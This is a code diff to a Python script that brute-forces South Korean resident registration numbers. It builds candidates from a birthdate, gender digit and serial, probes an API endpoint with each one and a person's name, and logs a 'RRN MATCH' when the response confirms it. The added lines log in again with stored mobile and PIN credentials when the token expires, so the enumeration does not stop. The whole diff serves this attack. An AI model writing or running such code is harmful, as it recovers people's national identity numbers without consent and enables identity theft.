@@ -70,6 +70,18 @@ def probe(token, name, rrn):
         return 0, repr(e)[:200]
 
 
+def relogin_if_needed(cr):
+    """Mid-scan JWT expiry (30 min) masquerades as a dead endpoint: relogin once."""
+    exp, _ = tokstore.jwt_exp(cr["token"])
+    if exp and time.time() > exp - 120:
+        nt, nn = tokstore._relogin(cr["mobile"], cr["pin"])
+        if nt:
+            cr["token"] = nt
+            print(f"RRNV relogged {cr['mobile']}", flush=True)
+        return nt is not None
+    return True
+
+
 def main():
     if os.path.exists(MARKER):
         print("RRNV park (endpoint previously dead)")
@@ -106,6 +118,9 @@ def main():
         gender = str(1 + gidx)
         print(f"RRNV {mob} name={cr.get('name')} bdy={bdy} gender={gender} serial={serial}", flush=True)
         while budget > 0 and serial < SERIALS:
+            if not relogin_if_needed(cr):
+                print(f"RRNV relogin failed for {mob} — moving on", flush=True)
+                break
             rrn = f"{bdy}{gender}{serial:06d}"
             hs, body = probe(cr["token"], cr.get("name", ""), rrn)
             budget -= 1
@@ -120,6 +135,22 @@ def main():
                 print(f"★★★★ RRN MATCH {mob} {rrn} :: {body[:200]}", flush=True)
                 serial = SERIALS  # finish this gender
             elif hs in (401, 404, 405):
+                # 401 is usually token expiry — relogin and retry once before parking
+                if hs == 401 and relogin_if_needed(cr):
+                    hs2, body2 = probe(cr["token"], cr.get("name", ""), rrn)
+                    journal({"ts": time.strftime("%FT%TZ", time.gmtime()), "mobile": mob,
+                             "rrn": rrn, "retry_after_relogin": True, "http": hs2,
+                             "sig": body2[:120]})
+                    if hs2 == 200:
+                        low2 = body2.lower().replace(" ", "")
+                        if '"chksucyn":"y"' in low2:
+                            st["matched"] = {"rrn": rrn, "body": body2[:500]}
+                            print(f"★★★★ RRN MATCH {mob} {rrn}", flush=True)
+                            serial = SERIALS
+                        serial += 1
+                        time.sleep(PACE)
+                        continue
+                    hs, body = hs2, body2
                 with open(MARKER, "w") as f:
                     f.write(f"http={hs} {body[:300]}")
                 print(f"RRNV {hs} — parking (endpoint dead for member token)", flush=True)
